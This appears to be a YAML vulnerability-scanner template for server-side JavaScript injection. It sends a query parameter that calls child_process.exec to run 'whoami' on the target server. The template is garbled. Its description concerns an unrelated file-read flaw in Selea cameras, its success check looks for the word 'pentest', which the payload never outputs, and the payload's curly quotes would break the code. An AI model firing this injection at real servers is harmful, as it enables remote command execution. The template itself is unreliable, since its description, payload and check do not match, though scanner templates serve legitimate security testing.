id: Server-Side-JavaScript-Injection

info:
  name: 服务器端JavaScript注入
  author: daffainfo
  severity: critical
  description: Selea OCR-ANPR摄像机SeleaCamera存在任意文件读取漏洞，攻击者通过构造特定的Url读取服务器的文件
  reference:
    - https://mp.weixin.qq.com/s/rQ2ABhu8Scib4vXSBz76mw

set:
  r1: randomLowercase(20)
rules:
  r0:
    request:
      method: GET
      path: /?code=require(‘child_process’).exec(‘whoami > {{r1}}.txt’)
    expression: response.status == 200 && response.body.bcontains(b'pentest')
expression: r0()